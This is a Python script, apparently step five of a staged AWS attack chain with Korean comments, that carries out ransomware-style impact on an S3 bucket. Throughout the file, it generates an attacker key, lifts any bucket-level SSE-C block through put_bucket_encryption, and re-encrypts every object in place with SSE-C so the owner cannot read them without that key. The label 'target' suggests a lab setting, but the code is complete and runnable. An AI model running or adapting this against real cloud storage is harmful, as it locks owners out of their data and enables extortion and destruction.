"""
Step 5 — Impact (데이터 파괴 및 조작)
target 버킷 객체를 SSE-C 방식으로 재암호화하여 공격자 키 없이는 복호화 불가 상태로 만든다.

실행 순서:
  1. 32바이트 암호화 키 로컬 생성 (attack/exfiltrated/sse_c.key 에 저장)
  2. 버킷 암호화 설정 조회 → SSE-C 차단 여부 확인
  3. SSE-C 차단 중이면 put-bucket-encryption 으로 차단 해제
  4. 버킷 객체 순회 → SSE-C 헤더 붙여 자기 자신에게 복사(재업로드)

단독 실행:
    python step5_impact.py \\
        --iam-access-key AKIA... --iam-secret-key xxxx \\
        --bucket cloud9-attack-target-a1b2c3d4

※ 2026-04 이후 S3는 SSE-C 기본 차단 — 3단계 차단 해제가 선행되어야 한다.
"""

import argparse
import base64
import hashlib
import json
import logging
import os
import sys

import boto3
from botocore.exceptions import ClientError

sys.path.insert(0, __file__.rsplit("\\", 1)[0] if "\\" in __file__ else ".")
import config

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

KEY_FILE_NAME = "sse_c.key"


def _generate_key(exfil_dir: str) -> bytes:
    """32바이트 랜덤 키 생성 후 로컬에 저장한다."""
    key = os.urandom(32)
    key_path = os.path.join(exfil_dir, KEY_FILE_NAME)
    with open(key_path, "wb") as f:
        f.write(key)
    log.info("  [+] SSE-C 암호화 키 생성: %s", key_path)
    log.info("      키(base64): %s", base64.b64encode(key).decode())
    return key


def _key_md5(key: bytes) -> str:
    return base64.b64encode(hashlib.md5(key).digest()).decode()


def _remove_ssec_block(s3, bucket: str) -> bool:
    """
    버킷 암호화 설정에 SSE-C 차단이 있으면 제거(PutBucketEncryption).
    이미 차단이 없으면 그냥 통과한다.
    Returns True if action was taken, False if already unblocked.
    """
    try:
        resp = s3.get_bucket_encryption(Bucket=bucket)
        rules = resp.get("ServerSideEncryptionConfiguration", {}).get("Rules", [])
        log.info("  [S3-Enc] 현재 암호화 규칙: %s", json.dumps(rules, default=str))
    except ClientError as e:
        # NoSuchServerSideEncryptionConfiguration → 설정 없음 (차단도 없음)
        if e.response["Error"]["Code"] == "NoSuchServerSideEncryptionConfiguration":
            log.info("  [S3-Enc] 암호화 기본값 설정 없음 — SSE-C 차단 없음으로 판단")
            return False
        raise

    # BlockedEncryptionTypes에 "SSE-C"가 명시된 경우에만 차단으로 판단
    blocked = any(
        "SSE-C" in r.get("BlockedEncryptionTypes", {}).get("EncryptionType", [])
        for r in rules
    )

    if not blocked:
        log.info("  [S3-Enc] SSE-C 차단 없음 — 재암호화 진행 가능")
        return False

    # SSE-C가 명시적으로 차단된 경우: 기존 rules에서 BlockedEncryptionTypes만 [NONE]으로 변경
    log.info("  [S3-Enc] SSE-C 차단 감지 — BlockedEncryptionTypes=[NONE] 으로 차단 해제")
    try:
        updated_rules = [
            {**r, "BlockedEncryptionTypes": {"EncryptionType": ["NONE"]}}
            for r in rules
        ]
        s3.put_bucket_encryption(
            Bucket=bucket,
            ServerSideEncryptionConfiguration={"Rules": updated_rules},
        )
        log.info("  [+] SSE-C 차단 해제 완료")
        return True
    except ClientError as e:
        log.error("  [-] put_bucket_encryption 실패: %s", e)
        raise


def _reencrypt_objects(s3, bucket: str, key: bytes) -> list[str]:
    """
    버킷 내 모든 객체를 SSE-C 방식으로 자기 자신에게 복사한다.
    Returns: 성공한 객체 키 목록
    """
    key_b64 = base64.b64encode(key).decode()
    key_md5 = _key_md5(key)
    success = []

    paginator = s3.get_paginator("list_objects_v2")
    try:
        pages = list(paginator.paginate(Bucket=bucket))
    except ClientError as e:
        log.error("  [-] 객체 목록 조회 실패: %s", e)
        return success

    for page in pages:
        for obj in page.get("Contents", []):
            obj_key = obj["Key"]
            log.info("  [SSE-C] 재암호화 중: %s", obj_key)
            try:
                # copy_source는 같은 버킷의 같은 키 (자기 자신에게 복사)
                s3.copy_object(
                    Bucket=bucket,
                    Key=obj_key,
                    CopySource={"Bucket": bucket, "Key": obj_key},
                    SSECustomerAlgorithm="AES256",
                    SSECustomerKey=key_b64,
                    SSECustomerKeyMD5=key_md5,
                    MetadataDirective="COPY",
                )
                log.info("  [+] 재암호화 완료: %s", obj_key)
                success.append(obj_key)
            except ClientError as e:
                log.error("  [-] 재암호화 실패 (%s): %s", obj_key, e)

    return success


def run(iam_access_key: str, iam_secret_key: str, bucket: str | None = None) -> dict:
    """
    Returns: {
        "key_file": str,              # 로컬 키 파일 경로
        "key_b64": str,               # base64 인코딩된 키 (복호화 시 필요)
        "ssec_block_removed": bool,
        "encrypted_objects": [str, ...],
    }
    """
    log.info("=" * 60)
    log.info("Step 5: Impact (SSE-C 재암호화)")
    log.info("=" * 60)

    bucket = bucket or config.TARGET_BUCKET
    base_dir = os.path.dirname(os.path.abspath(__file__))
    exfil_dir = os.path.join(base_dir, config.EXFIL_DIR)
    os.makedirs(exfil_dir, exist_ok=True)

    key = _generate_key(exfil_dir)
    key_file = os.path.join(exfil_dir, KEY_FILE_NAME)

    session = boto3.Session(
        aws_access_key_id=iam_access_key,
        aws_secret_access_key=iam_secret_key,
        region_name=config.REGION,
    )
    s3 = session.client("s3", region_name=config.REGION)

    block_removed = _remove_ssec_block(s3, bucket)
    encrypted = _reencrypt_objects(s3, bucket, key)

    result = {
        "key_file":           key_file,
        "key_b64":            base64.b64encode(key).decode(),
        "ssec_block_removed": block_removed,
        "encrypted_objects":  encrypted,
    }
    log.info("[Step 5 완료] 재암호화 객체 수: %d", len(encrypted))
    return result


if __name__ == "__main__":
    # .env 로드 (os.environ에 없는 키만)
    _env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
    if os.path.exists(_env_path):
        with open(_env_path) as _f:
            for _line in _f:
                _line = _line.strip()
                if not _line or _line.startswith("#") or "=" not in _line:
                    continue
                _k, _, _v = _line.partition("=")
                if _k.strip() not in os.environ:
                    os.environ[_k.strip()] = _v.strip()

    parser = argparse.ArgumentParser(description="Step 5: S3 객체 SSE-C 재암호화 (Impact)")
    parser.add_argument("--iam-access-key", default=None)
    parser.add_argument("--iam-secret-key", default=None)
    parser.add_argument("--bucket",         default=None,
                        help="타겟 버킷명 (기본: config.TARGET_BUCKET)")
    args = parser.parse_args()

    iam_key    = args.iam_access_key or os.environ.get("IAM_ACCESS_KEY_ID")
    iam_secret = args.iam_secret_key or os.environ.get("IAM_SECRET_ACCESS_KEY")
    if not (iam_key and iam_secret):
        print("[ERROR] --iam-access-key/--iam-secret-key 또는 .env의 IAM_ACCESS_KEY_ID/IAM_SECRET_ACCESS_KEY 필요")
        sys.exit(1)

    result = run(iam_key, iam_secret, args.bucket)
    print("\n[결과]")
    print(json.dumps(result, indent=2, ensure_ascii=False))
